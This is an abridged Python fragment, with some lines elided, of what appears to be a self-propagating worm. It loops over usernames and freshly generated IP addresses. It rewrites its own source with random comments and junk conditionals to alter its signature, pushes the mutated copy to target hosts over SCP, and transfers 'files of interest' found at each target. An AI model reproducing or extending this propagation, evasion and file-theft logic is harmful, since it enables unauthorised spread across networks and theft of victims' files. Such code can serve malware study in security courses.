        ...
        for user in usernames:
            ...
            for ip_address in get_fresh_ipaddresses(NHOSTS):
                ...
                try:
                    ...
                    # shutil.copyfile(sys.argv[0], './tempFolder/' + str(sys.argv[0]))
                    tempfile = open('./tempFolder/'+ str(sys.argv[0]), 'w')
                    ...
                    for line in IN.readlines():
                        ...
                        if randInt % 2 == 0 and linecount >130:
                            tempfile.write("#Random Comment " + str(randInt) + "\n")
                    if randInt % 3 == 0:
                        tempfile.write("if True:\n    pass\n")
                    elif randInt % 3 == 1:
                        tempfile.write("if " + str(randInt) + "==" + str(randInt) + ":\n" + "    pass\n")
                    else:
                        tempfile.write("if True:\n    tempval = 15\n")
                    # if True:
                    #     pass
                    ...
                    scpcon.put('./tempFolder/'+ str(sys.argv[0]))                
                    scpcon.close()
                ...
                if len(files_of_interest_at_target) > 0:
                    ...
                    try:
                        ...
                        for filename in files_of_interest_at_target:
                            name_file = str(filename).split('\'')[-2].split('/')[-1]
                            scpcon.put(name_file)
                        scpcon.close()
                    except: 
